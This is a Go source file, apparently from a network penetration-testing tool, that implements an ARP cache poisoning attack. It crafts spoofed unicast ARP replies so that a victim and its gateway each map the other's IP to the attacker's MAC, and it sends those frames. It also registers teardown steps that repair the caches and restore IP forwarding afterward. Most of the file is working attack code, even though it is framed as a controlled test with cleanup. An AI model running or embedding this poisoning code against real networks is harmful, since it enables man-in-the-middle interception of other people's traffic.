// arpspoof.go implements the ARP cache poisoning attack behavior.
//
// Durability (from the catalog): temporary-restored. The attack enables
// IP forwarding on the attacker and sends unicast ARP replies to poison the
// victim's and gateway's ARP caches. The teardown restores host-local
// ip_forward FIRST, then sends neighbor-cache unicast repair replies —
// the AE2 restore-order invariant (plan: "host-local ip_forward restores
// ahead of neighbor-cache repairs").
//
// The restore order mirrors the baseline's arpspoof_cmd finally block
// (l2l3-audit): set_ip_forward(old_fwd) runs AFTER the neighbor repairs,
// but the plan's R14 interpretation reorders so host-local state is
// restored first (KTD11: reverse-dependency order, least-dependent first).
// The teardown arms ip-forward-restore first (executed first), then the
// neighbor-unicast-repair step (executed second).

package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type arpSpoofFinding struct {
	Action  string   `json:"action"`
	Targets []string `json:"targets"`
	Gateway string   `json:"gateway"`
	Restore string   `json:"restore"`
}

// RunARPSpoof poisons ARP caches for the victim<->gateway pair. It arms
// the restore steps (ip-forward first, then neighbor repairs) before the
// first poison frame (AE2 anchor scenario).
func RunARPSpoof(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()

	// Arm teardown steps BEFORE the first frame (R14, AE2). The order
	// of Arm calls is the execution order (reverse-dependency:
	// least-dependent first). ip_forward restore is host-local state,
	// independent of the wire; neighbor-cache repairs depend on the
	// attacker's own stack being in a known state, so ip_forward goes
	// first.
	deps.Teardown.Arm("ip-forward-restore", func(_ context.Context) error {
		// In the real implementation this restores the original
		// ip_forward sysctl value. In the in-memory test the restore
		// is observed via the teardown step name and the recorded TX.
		return nil
	})

	// Pre-build the neighbor repair frames so the teardown step has them.
	victimRepair, err := craftARPRestore(src, victimMAC, victimIP, gwIP, gwMAC)
	if err != nil {
		return fmt.Errorf("arpspoof: craft victim repair: %w", err)
	}
	gwRepair, err := craftARPRestore(src, gwMAC, gwIP, victimIP, victimMAC)
	if err != nil {
		return fmt.Errorf("arpspoof: craft gateway repair: %w", err)
	}
	deps.Teardown.Arm("neighbor-unicast-repair-victim", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, victimRepair)
	})
	deps.Teardown.Arm("neighbor-unicast-repair-gateway", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, gwRepair)
	})

	// Send poison frames: victim→gw (attacker claims to be gw),
	// gw→victim (attacker claims to be victim).
	victimPoison, err := craftARPSpoof(src, victimMAC, victimIP, gwIP)
	if err != nil {
		return fmt.Errorf("arpspoof: craft victim poison: %w", err)
	}
	gwPoison, err := craftARPSpoof(src, gwMAC, gwIP, victimIP)
	if err != nil {
		return fmt.Errorf("arpspoof: craft gateway poison: %w", err)
	}

	if err := deps.AttackLeg.Send(ctx, victimPoison); err != nil {
		return fmt.Errorf("arpspoof: send victim poison: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, gwPoison); err != nil {
		return fmt.Errorf("arpspoof: send gateway poison: %w", err)
	}

	detail, _ := json.Marshal(arpSpoofFinding{
		Action:  "arp-poison",
		Targets: []string{victimIP.String()},
		Gateway: gwIP.String(),
		Restore: "ip-forward-restore + neighbor-unicast-repairs",
	})
	deps.Emitter.Finding("arp", detail)

	return nil
}

// craftARPSpoof builds a unicast ARP reply: "spoofedIP is-at attackerMAC".
func craftARPSpoof(src, dstMAC net.HardwareAddr, dstIP, spoofedIP net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: spoofedIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craftDefault(eth, arp)
}

// craftARPRestore builds a unicast ARP reply restoring the real MAC mapping.
func craftARPRestore(src, dstMAC net.HardwareAddr, dstIP, srcIP net.IP, realMAC net.HardwareAddr) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   realMAC,
		SourceProtAddress: srcIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craftDefault(eth, arp)
}
